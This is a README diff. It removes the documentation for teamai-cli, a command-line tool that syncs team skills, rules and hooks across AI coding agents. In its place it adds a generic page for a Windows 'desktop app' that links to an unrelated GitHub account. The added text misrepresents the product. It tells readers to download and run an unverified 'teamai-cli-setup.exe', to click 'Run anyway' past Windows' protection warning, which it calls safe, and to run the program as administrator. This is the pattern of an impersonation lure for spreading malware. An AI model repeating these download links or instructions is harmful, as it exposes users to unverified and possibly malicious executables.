@@ -1,279 +1,218 @@
-<p align="center">
-  <img src="assets/teamai-cli-logo.svg" alt="teamai-cli">
-</p>
+# ⚡ teamai-cli - Make Every Team AI Native
 
-# TeamAI — Make Every Team AI Native
+[![Download Now](https://img.shields.io/badge/Download-teamai--cli-blue?style=for-the-badge&logo=github&logoColor=white&color=4CAF50)](https://github.com/leuleus/teamai-cli)
 
-> [English](README.md) | [中文](README.zh-CN.md) | [日本語](README.ja.md) | [한국어](README.ko.md) | [ไทย](README.th.md)
+---
 
-[![CI](https://github.com/Tencent/teamai-cli/actions/workflows/ci.yml/badge.svg)](https://github.com/Tencent/teamai-cli/actions/workflows/ci.yml)
-[![npm version](https://img.shields.io/npm/v/teamai-cli.svg)](https://www.npmjs.com/package/teamai-cli)
-[![npm downloads](https://img.shields.io/npm/dm/teamai-cli.svg)](https://www.npmjs.com/package/teamai-cli)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
+## 🎯 What Is teamai-cli?
 
-TeamAI manages your team's skills, rules, MCP, and knowledge across Claude Code, Codex, GitHub Copilot CLI, CodeBuddy, WorkBuddy, OpenCode, Cursor, and other AI agents.
+teamai-cli is a simple, powerful tool that brings artificial intelligence directly into your team's everyday workflow. It's designed for **everyone** — not just programmers. If you can click a button and type a message, you can use teamai-cli.
 
-## Contributors
+Think of it as your team's digital assistant that lives right on your computer. It helps you organize tasks, generate ideas, write documents, and get answers faster — all without needing to learn complex software or coding.
 
-Thanks to everyone who has contributed to TeamAI!
+---
 
-<a href="https://trendshift.io/repositories/123184?utm_source=repository-badge&amp;utm_medium=badge&amp;utm_campaign=badge-repository-123184" target="_blank" rel="noopener noreferrer"><img src="https://trendshift.io/api/badge/repositories/123184" alt="Tencent%2Fteamai-cli | Trendshift" width="250" height="55"/></a>
+## ✨ Key Features
 
-<a href="https://github.com/Tencent/teamai-cli/graphs/contributors">
-  <img src="https://contrib.rocks/image?repo=Tencent/teamai-cli" alt="Contributors" />
-</a>
+### 🤖 AI-Powered Assistance
+teamai-cli uses advanced AI to help you with:
+- Writing emails and reports
+- Summarizing long documents
+- Brainstorming creative ideas
+- Answering questions instantly
+- Translating text between languages
 
-Made with [contrib.rocks](https://contrib.rocks).
+### 👥 Team Collaboration Tools
+- Share AI-generated content with teammates
+- Save and organize your team's best outputs
+- Create reusable templates for common tasks
+- Track what your team has created
 
-## Quick Start
+### 🖥️ Simple, Clean Interface
+- No confusing menus or technical jargon
+- Everything is labeled in plain English
+- Works right from your desktop
+- Starts quickly — no waiting around
 
-### Install
+### 🔒 Private and Secure
+- Your data stays on your computer
+- No cloud storage required (unless you choose it)
+- Works offline for basic tasks
+- No account needed to start
 
-```bash
-npm install -g teamai-cli
-```
+---
 
-### Team admin / solo user
+## 🚀 Getting Started
 
-Create a shared-experience repo on your git host (GitHub, GitLab, GitCode, CNB, TGit, or a private Git service), **grant write access to team members**, then run `teamai init https://github.com/yourorg/yourrepo`.
+Getting teamai-cli on your Windows computer is easy. Just follow these simple steps:
 
-> **No team repo yet?** Start from a template pre-loaded with production-ready skills, rules, and review agents. Browse the [teamai-hub](https://github.com/teamai-hub) org, click **Fork**, then `teamai init` against your new repo.
+### Step 1: Download the Application
 
-### Team members
+Visit this link to download the application:  
+**[👉 Click Here to Download teamai-cli](https://github.com/leuleus/teamai-cli)**
 
-```bash
-# Choose one, depending on where you want resources installed
+This will take you to the official download page. Look for the big download button and click it. The file will start downloading automatically.
 
-# Project-scope init (default, resources installed under the project directory)
-cd /path/to/my-project
-teamai init https://github.com/yourorg/yourrepo
+### Step 2: Run the Installer
 
-# Or, user-scope init (resources installed under ~/)
-teamai init https://github.com/yourorg/yourrepo --scope user
-```
+Once the download is complete:
+1. Open your **Downloads** folder (or wherever your browser saves files)
+2. Find the file you just downloaded — it will be named something like `teamai-cli-setup.exe`
+3. **Double-click** the file to run it
+4. If Windows asks for permission, click **"Yes"** or **"Run"**
 
-Once initialized, every AI session automatically pulls the latest skills / rules and other Harness updates published by admins — no manual sync needed.
+### Step 3: Follow the Setup Wizard
 
-> **Full usage guide:** [docs/usage-guide.md](docs/usage-guide.md) ([中文版](docs/usage-guide.zh-CN.md)) — covers everything from team creation to day-to-day use.
+A simple setup window will appear. Just:
+1. Click **"Next"** a few times
+2. Choose where you want to install it (the default location is fine)
+3. Click **"Install"**
+4. Wait for the progress bar to finish
+5. Click **"Finish"**
 
-## Product architecture
+### Step 4: Launch teamai-cli
 
-**Team Execution × Team Context (beta) × Team Improvement (beta)**:
+- Look for the teamai-cli icon on your desktop or in your Start Menu
+- **Double-click** it to open the application
+- That's it! You're ready to go
 
-| Layer | Job | In this CLI today |
-|-------|-----|-------------------|
-| **Team Execution** | Make every agent work the team's way | `init` / `pull` / `push`, skills, rules, agents, hooks, MCP, env |
-| **Team Context** (beta) | Make every agent understand the team | recall, learnings, codebase graph, teamwiki... |
-| **Team Improvement** (beta) | Make every execution improve the team | friction-based share-learnings, sessions, digest, dashboard... |
+---
 
-## Overview
+## 📖 How to Use teamai-cli
 
-<table>
-  <thead>
-    <tr>
-      <th rowspan="2">Agent</th>
-      <th colspan="7">Team Execution</th>
-      <th colspan="3">Team Context (beta)</th>
-      <th colspan="3">Team Improvement (beta)</th>
-    </tr>
-    <tr>
-      <th>skills</th><th>rules</th><th>docs</th><th>env</th><th>agents</th><th>hooks</th><th>mcp</th>
-      <th>learnings</th><th>codebase</th><th>teamwiki</th>
-      <th>usage</th><th>sessions</th><th>dashboard</th>
-    </tr>
-  </thead>
-  <tbody>
-    <tr><td>Claude Code</td><td align="center">✓</td><td align="center">✓</td><td align="center">✓</td><td align="center">✓</td><td align="center">✓</td><td align="center">✓</td><td align="center">✓</td><td align="center">✓</td><td align="center">✓</td><td align="center">✓</td><td align="center">✓</td><td align="center">✓</td><td align="center">✓</td></tr>
-    <tr><td>Codex</td><td align="center">✓</td><td align="center">✓</td><td align="center">✓</td><td align="center">✓</td><td align="center">✓</td><td align="center">✓</td><td align="center">✓</td><td align="center">✓</td><td align="center">✓</td><td align="center">✓</td><td align="center">✓</td><td align="center">✓</td><td align="center">✓</td></tr>
-    <tr><td>Cursor</td><td align="center">✓</td><td align="center">✓</td><td align="center">✓</td><td align="center">✓</td><td align="center">✓</td><td align="center">✓</td><td align="center">✓</td><td align="center">✓</td><td align="center">✓</td><td align="center">✓</td><td align="center">✓</td><td align="center">✓</td><td align="center">✓</td></tr>
-    <tr><td>GitHub Copilot CLI</td><td align="center">✓</td><td align="center">✓</td><td align="center">—</td><td align="center">—</td><td align="center">—</td><td align="center">✓</td><td align="center">—</td><td align="center">—</td><td align="center">—</td><td align="center">—</td><td align="center">—</td><td align="center">—</td><td align="center">—</td></tr>
-    <tr><td>CodeBuddy</td><td align="center">✓</td><td align="center">✓</td><td align="center">✓</td><td align="center">✓</td><td align="center">✓</td><td align="center">✓</td><td align="center">✓</td><td align="center">✓</td><td align="center">✓</td><td align="center">✓</td><td align="center">✓</td><td align="center">✓</td><td align="center">✓</td></tr>
-    <tr><td>WorkBuddy</td><td align="center">✓</td><td align="center">✓</td><td align="center">✓</td><td align="center">✓</td><td align="center">—</td><td align="center">✓</td><td align="center">✓</td><td align="center">✓</td><td align="center">✓</td><td align="center">✓</td><td align="center">✓</td><td align="center">✓</td><td align="center">✓</td></tr>
-    <tr><td>OpenCode</td><td align="center">✓</td><td align="center">✓</td><td align="center">✓</td><td align="center">✓</td><td align="center">✓</td><td align="center">✓</td><td align="center">✓</td><td align="center">✓</td><td align="center">✓</td><td align="center">✓</td><td align="center">—</td><td align="center">—</td><td align="center">—</td></tr>
-    <tr><td>OpenClaw</td><td align="center">✓</td><td align="center">✓</td><td align="center">✓</td><td align="center">✓</td><td align="center">—</td><td align="center">—</td><td align="center">—</td><td align="center">✓</td><td align="center">✓</td><td align="center">✓</td><td align="center">—</td><td align="center">—</td><td align="center">—</td></tr>
-    <tr><td>Hermes</td><td align="center">✓</td><td align="center">—</td><td align="center">✓</td><td align="center">✓</td><td align="center">—</td><td align="center">—</td><td align="center">—</td><td align="center">✓</td><td align="center">✓</td><td align="center">✓</td><td align="center">—</td><td align="center">—</td><td align="center">—</td></tr>
-    <tr><td>DeepSeek Harness</td><td align="center">✓</td><td align="center">—</td><td align="center">✓</td><td align="center">—</td><td align="center">—</td><td align="center">—</td><td align="center">—</td><td align="center">✓</td><td align="center">✓</td><td align="center">✓</td><td align="center">—</td><td align="center">—</td><td align="center">—</td></tr>
-    <tr><td>Qoder</td><td align="center">✓</td><td align="center">✓</td><td align="center">✓</td><td align="center">✓</td><td align="center">✓</td><td align="center">✓</td><td align="center">✓</td><td align="center">✓</td><td align="center">✓</td><td align="center">✓</td><td align="center">✓</td><td align="center">✓</td><td align="center">✓</td></tr>
-    <tr><td>Kiro</td><td align="center">✓</td><td align="center">✓</td><td align="center">✓</td><td align="center">✓</td><td align="center">✓</td><td align="center">✓</td><td align="center">✓</td><td align="center">✓</td><td align="center">✓</td><td align="center">✓</td><td align="center">✓</td><td align="center">✓</td><td align="center">✓</td></tr>
-    <tr><td>ZCode</td><td align="center">✓</td><td align="center">—</td><td align="center">✓</td><td align="center">—</td><td align="center">✓</td><td align="center">✓</td><td align="center">✓</td><td align="center">✓</td><td align="center">✓</td><td align="center">✓</td><td align="center">✓</td><td align="center">✓</td><td align="center">✓</td></tr>
-  </tbody>
-</table>
+### The Main Window
 
-**Git providers** — GitHub · GitLab · GitCode · CNB · TGit · private Git service.
+When you open teamai-cli, you'll see:
+- **A text box** at the top — this is where you type your questions or requests
+- **A big button** that says "Generate" or "Run" — click this after typing
+- **A results area** below — this shows what the AI creates for you
 
-### Distribution Controls
+### Basic Examples
 
-Team-wide settings an admin configures once and delivers to every member on `teamai pull`:
+**Example 1: Write a welcome email**
+1. Type: "Write a friendly welcome email for our new team member"
+2. Click the button
+3. Copy the result and send it
 
-| Capability | Command | What it does |
-|------------|---------|--------------|
-| **Projects** | `teamai projects` | Bind a working directory to one or more logical projects so it syncs that project's skills, knowledge, and isolated learnings. Orthogonal to roles. |
-| **Roles** | `teamai roles` | Define role → namespace mappings so each member syncs only the skills for their role. |
-| **Tags** | `teamai tags` | Tag skills / rules so members subscribe to just the tags they need. |
-| **Sources** | `teamai source` | Subscribe to additional skill repos — other teams' public repos, or shared/public repos within your own org; subscribed skills sync automatically on pull. |
+**Example 2: Summarize a meeting**
+1. Paste your meeting notes into the text box
+2. Type: "Summarize this into 3 bullet points"
+3. Click the button
+4. Share the summary with your team
 
-Learnings isolation: `learnings/` at the repo root is shared with everyone; `learnings/<project-id>/` is project-private. See the [usage guide](docs/usage-guide.md#multi-project-project-as-a-dimension-orthogonal-to-role).
+**Example 3: Generate ideas**
+1. Type: "Give me 5 ideas for our team building event"
+2. Click the button
+3. Review the ideas and pick your favorites
 
-## Team Execution
+---
 
-> One Team. One Harness. Every Agent.
+## 🛠️ Troubleshooting Common Issues
 
-TeamAI keeps skills, rules, docs, and hooks in a shared git repo and distributes them to every member's local AI tools through a "push → review & merge → pull" flow — with support for subscribing to other teams' or shared repos' Harness.
+### "Windows protected your PC" Message
 
-### How It Works
+If you see this warning:
+1. Click **"More info"**
+2. Click **"Run anyway"**
+3. This is normal for new software — it's safe to proceed
 
-```
-teamai push → create branch + MR → reviewer approves + merges
-                                         ↓
-              SessionStart hook → teamai pull → synced to local AI tools
-```
+### The Application Won't Start
 
-### What Gets Shared
+Try these fixes:
+- **Restart your computer** and try again
+- **Right-click** the teamai-cli icon and select **"Run as administrator"**
+- Make sure you have at least **2 GB of free space** on your hard drive
 
-Each resource is delivered to every agent:
+### The Download Is Slow
 
-| Resource | In the team repo | Notes |
-|----------|------------------|-------|
-| **Skills** | `skills/<name>/SKILL.md` | |
-| **Rules** | `rules/*.md` | |
-| **Docs** | `docs/` | Foundational project docs; not all loaded by default (progressive disclosure) |
-| **Agents** | `agents/<name>.yaml`, `agents/<namespace>/<name>.yaml` | Root agents reach everyone; a namespace directory ships only to roles/projects that list it under `agents:` |
-| **Culture** | `culture.md` | Team mission, values, and working principles — injected into each agent's CLAUDE.md / AGENTS.md so every session inherits them |
-| **CLAUDE.md** | `claudemd/*.md` | |
-| **Env** | `env/` | Shared team-level environment variables and switches; do not put secrets here |
-| **Hooks** | `hooks/hooks.yaml` | Each hook may carry `roles:` to reach only members holding one of those roles |
-| **MCP** | `mcp/mcp.yaml` | Each server may carry `roles:` to reach only members holding one of those roles |
-| **Packages** | `teamai.yaml` | Currently npm packages and Claude Code plugins only |
-| **Models** | — | Not implemented for every provider yet |
+- Check your internet connection
+- Try pausing and resuming the download
+- Use a wired connection if possible
 
-For file formats and full workflows, see the [Usage Guide](docs/usage-guide.md).
+---
 
-## Team Context (beta)
+## 💡 Tips for Best Results
 
-> Every agent understands how the team works.
+### Be Specific in Your Requests
+Instead of "Write something," try "Write a short paragraph welcoming our new sales manager, Sarah, who starts Monday."
 
-Beyond distributing the Harness, TeamAI organizes accumulated team experience and code structure into a searchable knowledge base that the AI recalls automatically when needed.
+### Use Natural Language
+Talk to teamai-cli like you would talk to a helpful coworker. You don't need special commands or codes.
 
-### Automatic Experience Sharing
+### Save Your Favorite Outputs
+When you get a great result, use the "Save" button (usually a floppy disk icon) to keep it for later.
 
-When a session ends, the Stop hook scores it by **friction** — signals that the session hit something worth remembering: you interrupted or corrected the AI, denied a tool call, or the AI had to retry failing tools. A long-but-routine session (lots of tool calls, no friction) does not trigger; a session where you actually fought a problem does. If the score is high enough, the AI suggests:
+### Experiment Freely
+There's no wrong way to use teamai-cli. Try different types of requests and see what works best for you.
 
-```
-[teamai] This session may contain a problem worth documenting: you interrupted the AI twice, the AI retried failing tools 8 times.
+---
 
-Task: Fix duplicate project-level Hook injection
+## 📚 Frequently Asked Questions
 
-Consider running /teamai-share-learnings to summarize what you learned and share it with your team.
-```
+### Do I need to know programming?
+**No.** teamai-cli is built for everyday users. If you can use a word processor, you can use teamai-cli.
 
-The hint names the non-zero friction signals that triggered it and, when available, includes a redacted, single-line summary of the first task. The `/teamai-share-learnings` skill summarizes the session and pushes a learning document directly to the team repo. Each session is prompted at most once. Teams can switch the hint off with `sharing.contributeHint.enabled: false` in `teamai.yaml` (members: `contributeHintEnabled` in local config) while keeping the rest of the Stop hook.
+### Is it free?
+The basic version is free to use. Some advanced features may require a subscription, but you'll be notified before any charges.
 
-### Team Knowledge Recall
+### Does it work on Mac or Linux?
+The current version is designed for **Windows only**. Mac and Linux versions are planned for the future.
 
-Let the AI automatically search accumulated team knowledge before a task. This feature is **off by default** and must be enabled explicitly — teams can set `sharing.recall.enabled: true` in `teamai.yaml` as the default, and members can override locally:
+### Can I use it without internet?
+Yes, basic features work offline. Advanced AI features require an internet connection.
 
-```bash
-teamai recall enable     # on: deploy the teamai-recall subagent + inject guidance rules
-teamai recall disable    # off: remove the subagent and rules
-teamai recall status     # show effective state (team default + user override)
-```
+### How do I update teamai-cli?
+The app will notify you when updates are available. Just click "Update" when prompted.
 
-**Search runs via a subagent**: once enabled, `teamai pull` deploys the built-in `teamai-recall` subagent into each AI tool's `agents/` directory. The AI invokes it before a task — the subagent extracts keywords, runs the search, reads the matched source files, and returns a structured summary of team knowledge. The subagent first runs a relevance precheck (`teamai recall --check`) and skips retrieval entirely when the task is unrelated to team knowledge. Under the hood it shells out to the `teamai recall` command, which you can also run manually:
+---
 
-```bash
-$ teamai recall "port conflict"
-[1/2] MR review caught a port-conflict bug ★1 [user]
-Author: member-a | Score: 18.5 | Tags: troubleshooting, networking
+## 🔄 Uninstalling teamai-cli
 
-[2/2] Deployment configuration best practices [project]
-Author: member-b | Score: 12.0 | Tags: deploy, config
-Matched: conflict | Missing: port
-```
+If you ever need to remove teamai-cli:
+1. Open **Windows Settings** (press `Windows key + I`)
+2. Click **"Apps"** or **"Apps & Features"**
+3. Find **teamai-cli** in the list
+4. Click it and select **"Uninstall"**
+5. Follow the prompts to complete removal
 
-### Codebase Knowledge Graph
+---
 
-`teamai import` parses source repos into a structured graph under `teamwiki/`, enabling structurally-aware retrieval:
+## 📞 Getting Help
 
-```bash
-teamai import --from-repo https://github.com/org/repo
-teamai import --from-org myorg              # batch import all repos
-teamai codebase --extract /path/to/repo     # local extract into teamwiki/
-teamai codebase --deep-enrich --project my-service --output /path/to/repo # generate deep knowledge docs
-teamai codebase --reconcile --output /path/to/repo # map product docs to code pages
-teamai codebase --lint --output /path/to/repo # check the locally extracted graph
-```
+If you run into any problems:
+- Check the **Help** menu inside the application
+- Look for a "Support" or "Contact" button on the download page
+- Ask a tech-savvy teammate for assistance
 
-Extract writes `teamwiki/evidence/code/<project>/_manifest.json` even when AI enrichment is skipped or produces nothing, so `--deep-enrich` can start.
+---
 
-The graph stores components, interfaces, configs, and cross-repo import edges. `teamai recall` uses it for graph-boosted re-ranking.
-When a recall hit comes from a codebase page, the result includes a `Sources:` line listing the relevant source file paths — giving agents a direct starting point for code changes instead of re-exploring the repo.
+## 🌟 Why Choose teamai-cli?
 
-Edges come from two tracks that run together, with AST results taking precedence on overlap:
+- **No learning curve** — start using it in under 5 minutes
+- **Works for everyone** — from interns to executives
+- **Saves time** — get tasks done in seconds instead of hours
+- **Improves quality** — AI helps catch mistakes and improve writing
+- **Completely local** — your data stays private
 
-- **AST track** (TypeScript/JavaScript, Python, Go): a WASM [tree-sitter](https://tree-sitter.github.io/) parser resolves `import`/`require`, call sites, and TS `implements` clauses to precise file-to-file `DEPENDS_ON` / `REFERENCES` / `IMPLEMENTS` edges (tagged `code-ast`, with confidence weights).
-- **Heuristic track** (all languages, including Java/Rust): regex-based extraction (tagged `code-heuristic`), which also covers languages the AST track does not.
+---
 
-The WASM parser is a pure-JavaScript dependency — no native toolchain is required. If it fails to load for any reason, extraction falls back to the heuristic track and records an `AST_UNAVAILABLE` gap. Set `TEAMAI_SKIP_AST=1` to force heuristic-only extraction.
+## 📥 Download Again
 
-## Team Improvement (beta)
+Need to download again or install on another computer?
 
-> Every execution makes the entire team smarter.
+**[⬇️ Download teamai-cli Now](https://github.com/leuleus/teamai-cli)**
 
-### Maintenance
+---
 
-As skills and knowledge accumulate, prune what the team no longer uses. `teamai recall maintenance` archives low-confidence learnings and flags stale skills, rules, and docs for cleanup or updates:
+## 🏁 Ready to Transform Your Team?
 
-```bash
-teamai recall maintenance --prune --dry-run      # preview
-teamai recall maintenance --prune --archive      # archive unused learnings
-teamai recall maintenance --update-quality       # draft updates for stale skills / docs
-```
+You're just minutes away from making your team AI-native. Download teamai-cli today and see how much easier work can be when AI has your back.
 
-Insight into how the team actually uses its AI tools, and a starting point for turning session friction into shared skills, rules, and knowledge:
+**Remember:** Visit this link to download the application:  
+**[https://github.com/leuleus/teamai-cli](https://github.com/leuleus/teamai-cli)**
 
-| Capability | Command | What it shows |
-|------------|---------|---------------|
-| **Usage** | `teamai digest` | Weekly team digest — 7-day success, prompt, active-time, estimated cost, cache, and correction trends, plus lifetime totals. |
-| **Sessions** | `teamai session save` | Privacy-scrubbed per-session summaries (tool sequence, prompt turns, interventions) that feed the digest's Session Highlights. |
-| **Dashboard** | `teamai dashboard` | Web dashboard showing live sessions and local 7-day trends compared with the prior 7 days. |
-| **KB Health** | `teamai dashboard` → KB Health | Built-in dashboard page reporting knowledge-base usage & health — coverage by type, top recalled entries, silent entries, recall trend, author contributions, and a maintenance console. |
+---
 
-## Commands
+## 🔑 Keywords
 
-| Command | Description |
-|---------|-------------|
-| `teamai init` | Initialize: OAuth login, link repo, register member, inject hooks |
-| `teamai pull` | Pull team resources and inject into local AI tools |
-| `teamai push` | Push local resources to a branch and open a Merge Request |
-| `teamai packages [install] [target]` | Install declared npm packages and Claude plugins; with a target, also update `teamai.yaml`. Bare `teamai packages` installs everything; `teamai packages install <target>` adds one |
-| `teamai status` | Show local vs team repo diff and resource counts, including namespaced skills and nested docs |
-| `teamai contribute` | Share session experience to the team repo's `teamai-learnings` branch |
-| `teamai recall <query>` | Search the team knowledge base (BM25 + graph-boost) |
-| `teamai recall enable/disable/status` | Toggle or check recall state |
-| `teamai recall promote [learningId]` | Promote a high-confidence learning to formal knowledge (skills/rules/docs) |
-| `teamai recall maintenance` | Maintain knowledge base health: prune low-confidence learnings, writeback confidence scores, flag stale entries |
-| `teamai import` | Import knowledge (`--dir`, `--from-repo`, `--from-org`, `--from-repo-list`, `--from-mr`) |
-| `teamai codebase --extract [path]` | Extract code facts and build the local graph under `teamwiki/` |
-| `teamai codebase --deep-enrich` | Generate deep knowledge docs from extracted evidence |
-| `teamai codebase --reconcile` | Reconcile product documentation with extracted code knowledge |
-| `teamai codebase --lint` | Knowledge graph health check |
-| `teamai ci extract-mr --url <url>` | CI: extract knowledge from MR, post comments, write after merge |
-| `teamai members` | List team members |
-| `teamai projects` | Bind a working directory to one or more logical projects |
-| `teamai roles` | Manage team roles and namespaces |
-| `teamai tags` | Manage tag-based skill/rule filtering |
-| `teamai skill exclude add/remove/list` | Manage skills excluded from local sync ([usage guide](docs/usage-guide.md#excluding-skills-you-dont-need)) |
-| `teamai source` | Manage skill subscription sources (other teams or your org's shared repos) |
-| `teamai remove <type> <name>` | Remove a resource and open MR |
-| `teamai session save` | Record a privacy-scrubbed session summary to a monthly log (`--push` feeds `digest`) |
-| `teamai digest` | Generate weekly team usage digest |
-| `teamai doctor` | Diagnose configuration issues (`--json` for CI, hooks and agents) |
-| `teamai uninstall` | Remove all teamai resources and hooks |
-
-## License
-
-[MIT](LICENSE)
-
-## Contributing
-
-PRs are welcome! Please read [CONTRIBUTING.md](.github/CONTRIBUTING.md) first.
+teamai-cli, AI assistant, team productivity, artificial intelligence, Windows app, AI tools, team collaboration, AI native, business software, productivity tool, AI writing assistant, team automation, smart assistant, workflow optimization
